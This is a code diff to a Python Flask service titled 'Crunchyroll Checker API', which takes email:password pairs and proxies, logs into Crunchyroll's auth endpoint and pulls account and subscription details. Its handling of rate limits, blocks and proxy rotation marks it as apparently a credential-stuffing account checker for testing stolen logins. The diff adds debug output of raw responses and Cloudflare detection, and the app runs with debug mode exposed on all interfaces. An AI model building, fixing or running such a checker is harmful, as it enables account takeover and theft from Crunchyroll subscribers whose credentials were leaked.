@@ -53,6 +53,8 @@ def get_access_token(email, password, proxy=None):
             "https://beta-api.crunchyroll.com/auth/v1/token",
             headers=auth_request_headers, data=data, proxies=proxies, timeout=15
         )
+        print("\nLOGIN STATUS:", res.status_code)
+        print("LOGIN RESP:", res.text)
         if res.status_code in [403, 429, 500, 502, 503]:
             return None, "Blocked/RateLimited by Crunchyroll/Proxy.", session
         if "invalid_credentials" in res.text:
@@ -84,12 +86,15 @@ def fetch_web_account_details(session, token, email, password, proxies=None, ua=
             proxies=proxies,
             timeout=10
         )
-        if me_res.status_code != 200:
-            return "Failed to fetch account ID.", None
+        print("\nME STATUS:", me_res.status_code)
+        print("ME RESP:", me_res.text)
+        # Check for Cloudflare or HTML page
+        if me_res.status_code != 200 or not me_res.headers.get("Content-Type", "").startswith("application/json"):
+            return f"Failed to fetch account ID. (Status: {me_res.status_code})\nResponse: {me_res.text[:300]}", None
         me_json = me_res.json()
         account_id = me_json.get("account_id")
         if not account_id:
-            return "No account_id in Crunchyroll response.", None
+            return f"No account_id in Crunchyroll response. Raw: {me_res.text[:300]}", None
     except Exception as e:
         return f"Exception getting account ID: {e}", None
 
@@ -107,8 +112,10 @@ def fetch_web_account_details(session, token, email, password, proxies=None, ua=
             proxies=proxies,
             timeout=20
         )
+        print("\nSUBS STATUS:", subs_res.status_code)
+        print("SUBS RESP:", subs_res.text)
         if subs_res.status_code != 200:
-            return "Failed to fetch subscription details.", None
+            return f"Failed to fetch subscription details. (Status: {subs_res.status_code})\nResponse: {subs_res.text[:300]}", None
         data = subs_res.json()
     except Exception as e:
         return f"Exception fetching subs: {e}", None
@@ -227,4 +234,4 @@ def home():
     return "<h3>Crunchyroll Checker API<br>Use /check?email=email:pass&proxy=proxy</h3>"
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5050, debug=True)
+    app.run(host="0.0.0.0", port=5000, debug=True)
